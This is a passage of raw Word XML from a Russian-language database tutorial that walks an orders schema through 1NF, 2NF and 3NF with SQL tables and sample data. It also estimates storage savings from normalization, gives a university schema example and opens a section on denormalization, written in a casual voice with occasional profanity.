          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE order_item_1nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_email VARCHAR(100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price INT</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| order_id | customer_name | customer_email | item   | price |</w:t>
        <w:br/>
        <w:t>|----------|---------------|----------------|--------|-------|</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | ivan@mail.ru   | Носки  | 150   |</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | ivan@mail.ru   | Трусы  | 200   |</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | ivan@mail.ru   | Майка  | 300   |</w:t>
        <w:br/>
        <w:t>| 2        | Петров        | petr@mail.ru   | Трусы  | 200   |</w:t>
        <w:br/>
        <w:t>| 3        | Иванов        | ivan@mail.ru   | Носки  | 150   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`customer_name` и `customer_email` дублируются (не 2НФ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`price` зависит от `item`, а не от первичного ключа `(order_id, item)` (не 2НФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 2: Приведение к 2НФ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разбиваем на три таблицы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица заказов</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_2nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_email VARCHAR(100)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров</w:t>
        <w:br/>
        <w:t>CREATE TABLE item_2nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50) PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price INT</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Связь "заказ-товар"</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item_2nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, item_name),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (order_id) REFERENCES order_2nf(order_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (item_name) REFERENCES item_2nf(item_name)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица `order_2nf`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| order_id | customer_name | customer_email |</w:t>
        <w:br/>
        <w:t>|----------|---------------|----------------|</w:t>
        <w:br/>
        <w:t>| 1        | Иванов        | ivan@mail.ru   |</w:t>
        <w:br/>
        <w:t>| 2        | Петров        | petr@mail.ru   |</w:t>
        <w:br/>
        <w:t>| 3        | Иванов        | ivan@mail.ru   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица `item_2nf`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| item_name | price |</w:t>
        <w:br/>
        <w:t>|-----------|-------|</w:t>
        <w:br/>
        <w:t>| Носки     | 150   |</w:t>
        <w:br/>
        <w:t>| Трусы     | 200   |</w:t>
        <w:br/>
        <w:t>| Майка     | 300   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица `order_item_2nf`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| order_id | item_name |</w:t>
        <w:br/>
        <w:t>|----------|-----------|</w:t>
        <w:br/>
        <w:t>| 1        | Носки     |</w:t>
        <w:br/>
        <w:t>| 1        | Трусы     |</w:t>
        <w:br/>
        <w:t>| 1        | Майка     |</w:t>
        <w:br/>
        <w:t>| 2        | Трусы     |</w:t>
        <w:br/>
        <w:t>| 3        | Носки     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В таблице `order_2nf` данные клиента (`customer_name`, `customer_email`) дублируются для каждого заказа (не 3НФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаг 3: Приведение к 3НФ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Выносим клиентов в отдельную таблицу:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица клиентов</w:t>
        <w:br/>
        <w:t>CREATE TABLE customer_3nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT PRIMARY KEY AUTO_INCREMENT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100) UNIQUE</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица заказов</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_3nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_date DATE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (customer_id) REFERENCES customer_3nf(customer_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров (без изменений)</w:t>
        <w:br/>
        <w:t>CREATE TABLE item_3nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50) PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price INT</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Связь "заказ-товар" (без изменений)</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item_3nf (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    quantity INT DEFAULT 1,  -- Добавим количество для реализма</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (order_id, item_name),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (order_id) REFERENCES order_3nf(order_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (item_name) REFERENCES item_3nf(item_name)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Данные:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица `customer_3nf`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| customer_id | name   | email          |</w:t>
        <w:br/>
        <w:t>|-------------|--------|----------------|</w:t>
        <w:br/>
        <w:t>| 1           | Иванов | ivan@mail.ru   |</w:t>
        <w:br/>
        <w:t>| 2           | Петров | petr@mail.ru   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Таблица `order_3nf`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| order_id | customer_id | order_date |</w:t>
        <w:br/>
        <w:t>|----------|-------------|------------|</w:t>
        <w:br/>
        <w:t>| 1        | 1           | 2025-01-10 |</w:t>
        <w:br/>
        <w:t>| 2        | 2           | 2025-01-11 |</w:t>
        <w:br/>
        <w:t>| 3        | 1           | 2025-01-12 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества 3НФ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет дублирования (клиент хранится один раз)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет аномалий обновления (изменил email клиента в одном месте)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет аномалий удаления (удалил заказ, но клиент остался)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет аномалий вставки (можно добавить клиента без заказа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Расчёт размера БД до и после нормализации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У нас 10,000 клиентов, каждый сделал в среднем 5 заказов. Всего 50,000 заказов. Посчитать, сколько места занимает БД до и после нормализации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ненормализованная таблица:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE order_bad (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,          -- 4 байта</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_name VARCHAR(50),  -- 50 байт (предполагаем полное заполнение)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_email VARCHAR(100),  -- 100 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item VARCHAR(50),      -- 50 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price INT              -- 4 байта</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Размер одной строки: 4 + 50 + 100 + 50 + 4 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>208 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Количество строк (если в среднем 3 товара на заказ): 50,000 заказов × 3 товара = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>150,000 строк</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Общий размер:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 150,000 × 208 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>31,200,000 байт = 31.2 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализованная БД (3НФ):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица клиентов (10,000 строк)</w:t>
        <w:br/>
        <w:t>CREATE TABLE customer (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT,       -- 4 байта</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50),      -- 50 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(100)     -- 100 байт</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:t>-- Размер одной строки: 4 + 50 + 100 = 154 байта</w:t>
        <w:br/>
        <w:t>-- Всего: 10,000 × 154 = 1,540,000 байт = 1.54 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица заказов (50,000 строк)</w:t>
        <w:br/>
        <w:t>CREATE TABLE order (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,          -- 4 байта</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT,       -- 4 байта</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_date DATE        -- 4 байта</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:t>-- Размер одной строки: 4 + 4 + 4 = 12 байт</w:t>
        <w:br/>
        <w:t>-- Всего: 50,000 × 12 = 600,000 байт = 0.6 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров (предположим, 100 уникальных товаров)</w:t>
        <w:br/>
        <w:t>CREATE TABLE item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50), -- 50 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price INT              -- 4 байта</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:t>-- Размер одной строки: 50 + 4 = 54 байта</w:t>
        <w:br/>
        <w:t>-- Всего: 100 × 54 = 5,400 байт = 0.0054 МБ</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Связь "заказ-товар" (150,000 строк)</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,          -- 4 байта</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50), -- 50 байт</w:t>
        <w:br/>
        <w:t xml:space="preserve">    quantity INT           -- 4 байта</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:t>-- Размер одной строки: 4 + 50 + 4 = 58 байт</w:t>
        <w:br/>
        <w:t>-- Всего: 150,000 × 58 = 8,700,000 байт = 8.7 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Общий размер нормализованной БД:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1.54 + 0.6 + 0.0054 + 8.7 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10.85 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выигрыш:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 31.2 МБ → 10.85 МБ = экономия </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>65%</w:t>
      </w:r>
      <w:r>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Университет (студенты, курсы, преподаватели)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плохая структура (UNF):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| student_name | courses                     | instructors           | grades       |</w:t>
        <w:br/>
        <w:t>|--------------|-----------------------------|-----------------------|--------------|</w:t>
        <w:br/>
        <w:t>| Иванов       | Математика, Физика, Химия   | Петров, Сидоров, Козлов | 5, 4, 3      |</w:t>
        <w:br/>
        <w:t>| Петрова      | Математика, Физика          | Петров, Сидоров       | 4, 5         |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3НФ:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица студентов</w:t>
        <w:br/>
        <w:t>CREATE TABLE student (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица курсов</w:t>
        <w:br/>
        <w:t>CREATE TABLE course (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_name VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица преподавателей</w:t>
        <w:br/>
        <w:t>CREATE TABLE instructor (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    instructor_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(50)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Связь "курс-преподаватель" (M:N, если курс могут вести несколько преподавателей)</w:t>
        <w:br/>
        <w:t>CREATE TABLE course_instructor (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    instructor_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (course_id, instructor_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (course_id) REFERENCES course(course_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (instructor_id) REFERENCES instructor(instructor_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Связь "студент-курс" с оценками</w:t>
        <w:br/>
        <w:t>CREATE TABLE enrollment (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    student_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    course_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    grade INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    PRIMARY KEY (student_id, course_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (student_id) REFERENCES student(student_id),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FOREIGN KEY (course_id) REFERENCES course(course_id)</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запрос:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти всех студентов, изучающих курсы преподавателя Петрова:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT DISTINCT s.name</w:t>
        <w:br/>
        <w:t>FROM student s</w:t>
        <w:br/>
        <w:t>JOIN enrollment e ON s.student_id = e.student_id</w:t>
        <w:br/>
        <w:t>JOIN course_instructor ci ON e.course_id = ci.course_id</w:t>
        <w:br/>
        <w:t>JOIN instructor i ON ci.instructor_id = i.instructor_id</w:t>
        <w:br/>
        <w:t>WHERE i.name = 'Петров';</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>7.3.6. Денормализация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что блять?!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> После всех этих разговоров про нормализацию я скажу: иногда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нужно делать наоборот</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — денормализовать данные. Жизнь сложна, чувак.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Денормализация</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это сознательное нарушение нормальных форм для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>повышения производительности</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда нужна денормализация?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Частые запросы с JOIN**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Если запрос соединяет 10 таблиц и выполняется 1000 раз в секунду, это пиздец для производительности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Добавить дублирующие данные, чтобы избежать JOIN.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аналитические запросы (OLAP)**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   В хранилищах данных (Data Warehouse) нормализация не нужна. Там используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>звезда</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Star Schema) или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>снежинка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Snowflake Schema), где есть дублирование.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кэширование данных**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Например, хранить `total_price` в таблице заказов, хотя его можно вычислить из `order_item`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример денормализации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Нормализованная версия:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Таблица заказов</w:t>
        <w:br/>
        <w:t>CREATE TABLE order (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    customer_id INT</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Таблица товаров в заказе</w:t>
        <w:br/>
        <w:t>CREATE TABLE order_item (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    item_name VARCHAR(50),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price INT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    quantity INT</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Запрос: Найти общую стоимость заказа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>SELECT order_id, SUM(price * quantity) AS total</w:t>
        <w:br/>
        <w:t>FROM order_item</w:t>
        <w:br/>
        <w:t>GROUP BY order_id;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Если запрос выполняется часто, это медленно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
